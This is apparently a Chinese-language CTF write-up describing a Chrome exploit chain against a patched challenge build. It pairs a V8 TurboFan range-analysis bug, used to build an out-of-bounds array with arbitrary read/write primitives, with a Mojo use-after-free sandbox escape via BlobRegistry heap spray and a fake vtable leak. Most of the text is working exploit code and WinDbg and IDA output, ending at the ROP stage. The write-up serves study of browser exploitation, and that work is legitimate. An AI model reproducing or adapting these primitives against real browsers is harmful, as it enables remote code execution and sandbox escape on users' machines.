+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function opt(b) &#123;</span><br><span class="line">  var x = b ? -1 : -0;</span><br><span class="line">  var y = b ? 2 : -0x80000000;</span><br><span class="line">  var i = x - y;</span><br><span class="line">  return i == -0x80000000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(false));</span><br></pre></td></tr></table></figure>
+<h3 id="OOB数组构造"><a href="#OOB数组构造" class="headerlink" title="OOB数组构造"></a>OOB数组构造</h3><p>我们注意到，还有一处patch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-          if (lowering-&gt;poisoning_level_ ==</span><br><span class="line">-                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">-              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">+          if ((index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                (index_type.Min() &gt;= 0.0 &amp;&amp;</span><br><span class="line">                 index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">             // The bounds check is redundant if we already know that</span><br><span class="line">             // the index is within the bounds of [0.0, length[.</span><br><span class="line">             // TODO(neis): Move this into TypedOptimization?</span><br><span class="line">             new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;</span><br><span class="line">+            DeferReplacement(node, node-&gt;InputAt(0));</span><br></pre></td></tr></table></figure>
+<p>此处patch的作用是在一些情况下将<code>checkbounds</code>节点消除，由于高版本V8已经不会将<code>checkbounds</code>节点直接消除，因此出题者为了降低难度增加了这个patch。构造OOB的数组过程如下，其过程比较简单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">var length_as_double = p64f(0x08042a89,0x200000);</span><br><span class="line">function opt(b) &#123;</span><br><span class="line">  //Range(-1,-0)</span><br><span class="line">  var x = b ? -1 : -0;</span><br><span class="line">  //Range(-1,-0x80000000)</span><br><span class="line">  var y = b ? 1 : -0x80000000;</span><br><span class="line"></span><br><span class="line">  //Range(-1,0)</span><br><span class="line">  var i = ((x - y) == -0x80000000);</span><br><span class="line">  if (b) i = -1;</span><br><span class="line"></span><br><span class="line">  //将i转换为数字，否则会进行Deoptimization</span><br><span class="line">  //Range(-1,0)</span><br><span class="line">  //reality:1</span><br><span class="line">  i = i &gt;&gt; 0;</span><br><span class="line">  //Range(0,1)</span><br><span class="line">  //reality:2</span><br><span class="line">  i = i + 1;</span><br><span class="line">  //Range(0,2)</span><br><span class="line">  //reality:4</span><br><span class="line">  i = i * 2;</span><br><span class="line">  //Range(1,3)</span><br><span class="line">  //reality:5</span><br><span class="line">  i = i + 1</span><br><span class="line">  var arr = [1.1,2.2,3.3,4.4,5.5];</span><br><span class="line">  var oob = [1.1,2.2];</span><br><span class="line">  arr[i] = length_as_double;</span><br><span class="line">  return oob;</span><br><span class="line">&#125;</span><br><span class="line">for(let i = 0; i &lt; 0x20000; i++)</span><br><span class="line">  opt(true);</span><br><span class="line"></span><br><span class="line">var oob = opt(false);</span><br><span class="line">oob.length = 0x1000;</span><br></pre></td></tr></table></figure>
+<p>查看一下IR图，在<code>V8.TFEscapeAnalysis</code>阶段时，还存在<code>CheckBound</code>节点<br><img src="https://p3.ssl.qhimg.com/t01d0cbf22e8ab75746.png"><br>然而到了<code>V8.TFSimplifiedLowering</code>阶段，该节点消除了，于是数组可以越界<br><img src="https://p1.ssl.qhimg.com/t01b310cdf5564f51f1.png"><br>构造出OOB数组以后，只需接下来布局几个对象，即可轻松实现<code>addressOf</code>，<code>read64</code>，<code>write64</code>等原语，实现任意地址读写。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var obj_arr = [&#123;&#125;];</span><br><span class="line">var float_arr = new Float64Array(1.1,2.2);</span><br><span class="line">var arr_buf = new ArrayBuffer(0x1000);</span><br><span class="line">var adv = new DataView(arr_buf);</span><br><span class="line"></span><br><span class="line">var compression_high = u64f(oob[0x1d])[0];</span><br><span class="line">print(&quot;compression_high=&quot; + compression_high.toString(16));</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   obj_arr[0] = obj;</span><br><span class="line">   var low = BigInt(u64f(oob[0x9])[1]) - 0x1n;</span><br><span class="line">   var addr = low | (BigInt(compression_high) &lt;&lt; 32n);</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read64(addr) &#123;</span><br><span class="line">   oob[0x22] = p64f(0,big2int(addr));</span><br><span class="line">   oob[0x23] = p64f(big2int(addr &gt;&gt; 32n),0);</span><br><span class="line">   return adv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write64(addr,value) &#123;</span><br><span class="line">   oob[0x22] = p64f(0,big2int(addr));</span><br><span class="line">   oob[0x23] = p64f(big2int(addr &gt;&gt; 32n),0);</span><br><span class="line">   adv.setBigUint64(0,value,true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>我们使用<code>addressOf</code>泄露出<code>chrome.dll</code>的地址，然后后续就可以计算出一些gadgets的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var window_addr = addressOf(window);</span><br><span class="line">chrome_dll_base = read64(window_addr+0x10n) - 0x7e86298n;</span><br><span class="line">console.log(&quot;chrome_dll_base=0x&quot; + chrome_dll_base.toString(16));</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-沙箱逃逸Mojo部分"><a href="#0x03-沙箱逃逸Mojo部分" class="headerlink" title="0x03 沙箱逃逸Mojo部分"></a>0x03 沙箱逃逸Mojo部分</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+void RenderFrameHostImpl::CreateAntNest(</span><br><span class="line">+    mojo::PendingReceiver&lt;antctf::mojom::AntNest&gt; receiver) &#123;</span><br><span class="line">+  mojo::MakeSelfOwnedReceiver(std::make_unique&lt;AntNestImpl&gt;(this),</span><br><span class="line">+                                std::move(receiver));</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>CreateAntNest</code>创建实例时，使用<code>std::make_unique&lt;AntNestImpl&gt;(this)</code>，创建了一个<code>AntNestImpl</code>对象，并使用<code>unique</code>智能指针进行管理，那么意味着这个<code>AntNestImpl</code>对象的生命周期与通信管道绑定了，在js层，我们可以通过<code>xxx.ptr.reset()</code>来手动释放。<code>this指针</code>也就是<code>RenderFrameHostImpl</code>对象的指针被保存于<code>AntNestImpl</code>对象中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+AntNestImpl::AntNestImpl(</span><br><span class="line">+        RenderFrameHost* render_frame_host)</span><br><span class="line">+        : render_frame_host_(render_frame_host)&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>并且在<code>AntNestImpl::Store</code>和<code>AntNestImpl::Fetch</code>函数中，有调用<code>render_frame_host_</code>中的虚表函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">+void AntNestImpl::Store(const std::string &amp;data)&#123;</span><br><span class="line">+    size_t depth = render_frame_host_-&gt;GetFrameDepth();</span><br><span class="line">+    if(depth == 0 || depth &gt; 10)&#123;</span><br><span class="line">+        return;</span><br><span class="line">+    &#125;</span><br><span class="line">+    size_t capacity = depth * 0x100;</span><br><span class="line">+    size_t count = capacity &lt; data.size() ? capacity : data.size();</span><br><span class="line">+    </span><br><span class="line">+    container_.emplace(</span><br><span class="line">+        std::make_pair(depth, data.substr(0, count))</span><br><span class="line">+    );</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+void AntNestImpl::Fetch(FetchCallback callback)&#123;</span><br><span class="line">+    size_t depth = render_frame_host_-&gt;GetFrameDepth();</span><br><span class="line">+    if(depth == 0 || depth &gt; 10)&#123;</span><br><span class="line">+        std::move(callback).Run(&quot;error depth&quot;);</span><br><span class="line">+        return;</span><br><span class="line">+    &#125;</span><br><span class="line">+    auto it = container_.find(depth);</span><br><span class="line">+    if(it == container_.end())&#123;</span><br><span class="line">+        std::move(callback).Run(&quot;not yet stored&quot;);</span><br><span class="line">+        return;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    std::move(callback).Run(it-&gt;second);</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
+<p>然而该对象不会随着<code>render_frame_host_</code>对象的销毁而销毁，这意味着即使<code>render_frame_host_</code>被释放了,其指针仍然在<code>AntNestImpl</code>对象中，我们仍然可以对其相关函数进行调用，这就造成了UAF。</p>
+<h3 id="开启Mojo功能"><a href="#开启Mojo功能" class="headerlink" title="开启Mojo功能"></a>开启Mojo功能</h3><p>正常情况下，<code>chrome</code>启动时是没有开启<code>Mojo</code>支持的，除非启动时加上选项<code>--enable-blink-features=MojoJS</code>，开启<code>Mojo</code>的判断逻辑如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void RenderFrameImpl::DidCreateScriptContext(v8::Local&lt;v8::Context&gt; context,</span><br><span class="line">                                             int world_id) &#123;</span><br><span class="line">  if (((enabled_bindings_ &amp; BINDINGS_POLICY_MOJO_WEB_UI) ||</span><br><span class="line">       enable_mojo_js_bindings_) &amp;&amp;</span><br><span class="line">      IsMainFrame() &amp;&amp; world_id == ISOLATED_WORLD_ID_GLOBAL) &#123;</span><br><span class="line">    // We only allow these bindings to be installed when creating the main</span><br><span class="line">    // world context of the main frame.</span><br><span class="line">    blink::WebContextFeatures::EnableMojoJS(context, true);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>从中可以看出，只有<code>main frame</code>才可以支持<code>Mojo</code>，判断<code>main frame</code>是通过<code>IsMainFrame</code>函数来判断，实质就是<code>frame</code>对象中的一个字段，可以用任意地址读写将其修改为<code>1</code>，即可满足这一个条件，然而第二个条件就是<code>enable_mojo_js_bindings_</code>为真或者<code>enabled_bindings_ </code>为<code>BINDINGS_POLICY_MOJO_WEB_UI</code>，即<code>2</code>，由于我们在V8方面已经可以任意地址读写，只需修改相关<code>RenderFrameImpl</code>对象中的一些字段，然后在js层使用<code>window.location.reload();</code>重新加载页面，即可开启Mojo。一个网页中可能会用多个<code>RenderFrameImpl</code>对象，我们可以使用如下方法在一个网页中添加一个<code>iframe</code>，其对应着<code>RenderFrameImpl</code>对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">iframe.src = &quot;child.html&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br></pre></td></tr></table></figure>
+<p>其中<code>child.html</code>内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;\html&gt;</span><br><span class="line">    &lt;\script type=&quot;text/javascript&quot; src=&quot;/mojo_bindings.js&quot;&gt;&lt;\/script&gt;</span><br><span class="line">    &lt;\script src=&quot;/third_party/blink/public/mojom/ant_nest/ant_nest.mojom.js&quot;&gt;&lt;\/script&gt;</span><br><span class="line">    &lt;\script src=&quot;/enable_mojo.js&quot;&gt;&lt;\/script&gt;</span><br><span class="line">    &lt;\script&gt;</span><br><span class="line">        if (checkMojo())  &#123;</span><br><span class="line">           antNestPtr = new antctf.mojom.AntNestPtr();</span><br><span class="line">           Mojo.bindInterface(antctf.mojom.AntNest.name,</span><br><span class="line">                mojo.makeRequest(antNestPtr).handle, &quot;context&quot;, true);</span><br><span class="line">           antNestPtr.store(&quot;aaaabbbb&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">           enable_mojo();</span><br><span class="line">           window.location.reload();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;\/script&gt;</span><br><span class="line">&lt;\/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这些<code>RenderFrameImpl</code>对象，通过<code>g_frame_map</code>存储，这是一个全局变量，其定义如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typedef std::map&lt;blink::WebFrame*, RenderFrameImpl*&gt; FrameMap;</span><br><span class="line">base::LazyInstance&lt;FrameMap&gt;::DestructorAtExit g_frame_map =</span><br><span class="line">    LAZY_INSTANCE_INITIALIZER;</span><br></pre></td></tr></table></figure>
+<p>可以大致知道它是一个<code>std::map</code>容器，由于题目给我们的<code>chrome.dll</code>是去掉符号的，但幸运的是保留了一些调试信息，因此可以根据一些调试信息来定位<code>g_frame_map</code>的位置，不然就得重新编译一份版本一样的进行比对。可以通过IDA过滤字符串<code>render_frame_impl.cc</code>，然后定位到该字符串，交叉引用，列出一些函数，然后查看函数，找到一些特征，然后再加以动态调试观察<br><img src="https://p0.ssl.qhimg.com/t0115520447550fa34e.png"><br>可以确定<code>7FF87C478E80</code>这个位置就是<code>g_frame_map</code>，其偏移为<code>0x8688e80</code>，于是，我们可以遍历<code>g_frame_map</code>，修改每一个<code>RenderFrameImpl</code>对象里的信息，使其满足开启<code>Mojo</code>的条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function enable_mojo() &#123;</span><br><span class="line">   var g_frame_map_addr = chrome_dll_base + 0x8688e80n;</span><br><span class="line">   console.log(&quot;g_frame_map_addr=0x&quot; + g_frame_map_addr.toString(16));</span><br><span class="line">   var begin_ptr = read64(g_frame_map_addr + 0x8n);</span><br><span class="line">   while (begin_ptr != 0n) &#123;</span><br><span class="line">      var render_frame_ptr = read64(begin_ptr + 0x28n);</span><br><span class="line">      console.log(&quot;render_frame_ptr=0x&quot; + render_frame_ptr.toString(16));</span><br><span class="line">      var enabled_bindings_addr = render_frame_ptr + 0x5acn;</span><br><span class="line">      console.log(&quot;enabled_bindings_addr=0x&quot; + enabled_bindings_addr.toString(16));</span><br><span class="line">      write32(enabled_bindings_addr,2);</span><br><span class="line">      var is_main_frame_addr = render_frame_ptr + 0xc8n;</span><br><span class="line">      console.log(&quot;is_main_frame_addr=0x&quot; + is_main_frame_addr.toString(16));</span><br><span class="line">      write8(is_main_frame_addr,1);</span><br><span class="line"></span><br><span class="line">      begin_ptr = read64(begin_ptr + 0x8n);</span><br><span class="line">   &#125;</span><br><span class="line">   resetBacking_store();</span><br><span class="line">   return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="泄露RenderFrameImpl对象地址"><a href="#泄露RenderFrameImpl对象地址" class="headerlink" title="泄露RenderFrameImpl对象地址"></a>泄露RenderFrameImpl对象地址</h3><p>制造UAF比较简单，然后我们可以利用<code>mojo</code>自带的<code>BlobRegistry</code>对象进行<code>heap spray</code>将数据布局，伪造好<code>render_frame_host_</code>的虚表，利用<code>BlobRegistry</code>进行<code>heap spray</code>的方法已经被国外大佬封装为函数，几乎可以在<code>Mojo</code>这一类UAF中统一使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">function getAllocationConstructor() &#123;</span><br><span class="line">   let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();</span><br><span class="line">   Mojo.bindInterface(blink.mojom.BlobRegistry.name,mojo.makeRequest(blob_registry_ptr).handle, &quot;process&quot;, true);</span><br><span class="line"></span><br><span class="line">   function Allocation(size=280) &#123;</span><br><span class="line">      function ProgressClient(allocate) &#123;</span><br><span class="line">         function ProgressClientImpl() &#123;</span><br><span class="line">         &#125;</span><br><span class="line">         ProgressClientImpl.prototype = &#123;</span><br><span class="line">            onProgress: async (arg0) =&gt; &#123;</span><br><span class="line">               if (this.allocate.writePromise) &#123;</span><br><span class="line">                  this.allocate.writePromise.resolve(arg0);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         this.allocate = allocate;</span><br><span class="line"></span><br><span class="line">         this.ptr = new mojo.AssociatedInterfacePtrInfo();</span><br><span class="line">         var progress_client_req = mojo.makeRequest(this.ptr);</span><br><span class="line">         this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);</span><br><span class="line"></span><br><span class="line">         return this;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      this.pipe = Mojo.createDataPipe(&#123;elementNumBytes: size, capacityNumBytes: size&#125;);</span><br><span class="line">      this.progressClient = new ProgressClient(this);</span><br><span class="line">      blob_registry_ptr.registerFromStream(&quot;&quot;, &quot;&quot;, size, this.pipe.consumer, this.progressClient.ptr).then((res) =&gt; &#123;</span><br><span class="line">         this.serialized_blob = res.blob;</span><br><span class="line">      &#125;);</span><br><span class="line">      this.malloc = async function(data) &#123;</span><br><span class="line">         promise = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">            this.writePromise = &#123;resolve: resolve, reject: reject&#125;;</span><br><span class="line">         &#125;);</span><br><span class="line">         this.pipe.producer.writeData(data);</span><br><span class="line">         this.pipe.producer.close();</span><br><span class="line">         written = await promise;</span><br><span class="line">         console.assert(written == data.byteLength);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      this.free = async function() &#123;</span><br><span class="line">         await this.serialized_blob.blob.ptr.reset();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      this.read = function(offset, length) &#123;</span><br><span class="line">         this.readpipe = Mojo.createDataPipe(&#123;elementNumBytes: 1, capacityNumBytes: length&#125;);</span><br><span class="line">         this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);</span><br><span class="line">         return new Promise((resolve) =&gt; &#123;</span><br><span class="line">            this.watcher = this.readpipe.consumer.watch(&#123;readable: true&#125;, (r) =&gt; &#123;</span><br><span class="line">               result = new ArrayBuffer(length);</span><br><span class="line">               this.readpipe.consumer.readData(result);</span><br><span class="line">               this.watcher.cancel();</span><br><span class="line">               resolve(result);</span><br><span class="line">            &#125;);</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      this.readQword = async function(offset) &#123;</span><br><span class="line">         let res = await this.read(offset, 8);</span><br><span class="line">         return (new DataView(res)).getBigUint64(0, true);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return this;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   async function allocate(data) &#123;</span><br><span class="line">      let allocation = new Allocation(data.byteLength);</span><br><span class="line">      await allocation.malloc(data);</span><br><span class="line">      return allocation;</span><br><span class="line">   &#125;</span><br><span class="line">   return allocate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了泄露<code>RenderFrameImpl</code>对象地址，我们可以将<code>GetFrameDepth</code>函数伪造为某一类特殊函数，首先能够正常被调用且返回，其次可以往我们能够控制的地方写入一些对象地址。一个在CFG绕过中的思想就可以用到这里了，我们将<code>GetFrameDepth</code>函数指针伪造为<code>RtlCaptureContext</code>，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">rax=00007ff87c342190 rbx=000000006b00c513 rcx=0000022c35d045e0</span><br><span class="line">rdx=0000004b4c3fe140 rsi=0000022c365f2e30 rdi=0000004b4c3fe140</span><br><span class="line">rip=00007ff874e2c47b rsp=0000004b4c3fe070 rbp=0000000000000002</span><br><span class="line"> r8=0000000000000000  r9=0000000000000000 r10=0000000000008000</span><br><span class="line">r11=0000004b4c3fdfc0 r12=0000022c365677c0 r13=0000004b4c3fe7c0</span><br><span class="line">r14=0000022c365f2e30 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">chrome!ovly_debug_event+0x1039e9b:</span><br><span class="line">00007ff8`74e2c47b ff90c8000000    call    qword ptr [rax+0C8h]</span><br></pre></td></tr></table></figure>
+<p>注意到此时<code>rcx</code>指向的就是<code>RenderFrameImpl</code>对象地址，我们想要泄露的就是这个值，我们看一下<code>RtlCaptureContext</code>的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000001800A0D10                 pushfq</span><br><span class="line">.text:00000001800A0D12                 mov     [rcx+78h], rax</span><br><span class="line">.text:00000001800A0D16                 mov     [rcx+80h], rcx</span><br><span class="line">.text:00000001800A0D1D                 mov     [rcx+88h], rdx</span><br><span class="line">.text:00000001800A0D24                 mov     [rcx+0B8h], r8</span><br><span class="line">.text:00000001800A0D2B                 mov     [rcx+0C0h], r9</span><br><span class="line">...........................</span><br></pre></td></tr></table></figure>
+<p>一句<code>mov     [rcx+80h], rcx</code>将<code>rcx</code>的值保存到了<code>RenderFrameImpl</code>对象内部，然后我们使用<code>BlobRegistry</code>对象将该处的数据读取出来就可以得到地址了。官方WP的做法也是这个原理，只不过他使用的是<code>content::WebContentsImpl::GetWakeLockContext</code>这个函数。所以，我们可以将虚表指针伪造为IAT表地址，使得<code>call    qword ptr [rax+0C8h]</code>正好调用到<code>RtlCaptureContext</code>，然后我们将数据读出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//伪造RenderFrameHost对象</span><br><span class="line"> const fakeRFH = new BigUint64Array(RenderFrameHost_SIZE / 8).fill(0x4141414141414141n);</span><br><span class="line"> //vtable</span><br><span class="line"> fakeRFH[0] = RtlCaptureContext_iat - 0xc8n;</span><br><span class="line"></span><br><span class="line"> //heap spray</span><br><span class="line"> for (var i=0;i&lt;spray_count;i++) &#123;</span><br><span class="line">    spray_arr.push(await allocate(fakeRFH.buffer));</span><br><span class="line"> &#125;</span><br><span class="line"> //call RtlCaptureContext</span><br><span class="line"> await antNestPtr.store(&quot;&quot;)</span><br><span class="line"> //now leak the address</span><br><span class="line"> var rfh_addr = -1;</span><br><span class="line"> //var allocation;</span><br><span class="line"> for (var i=0;i&lt;spray_count;i++) &#123;</span><br><span class="line">    allocation = spray_arr[i];</span><br><span class="line">    var x = await allocation.readQword(0x80);</span><br><span class="line">    if (x != 0x4141414141414141n) &#123;</span><br><span class="line">       rfh_addr = x;</span><br><span class="line">       break;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> if (rfh_addr == -1) &#123;</span><br><span class="line">    return false;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>现在，准备工作都做好了，那么就可以直接进行ROP了</p>
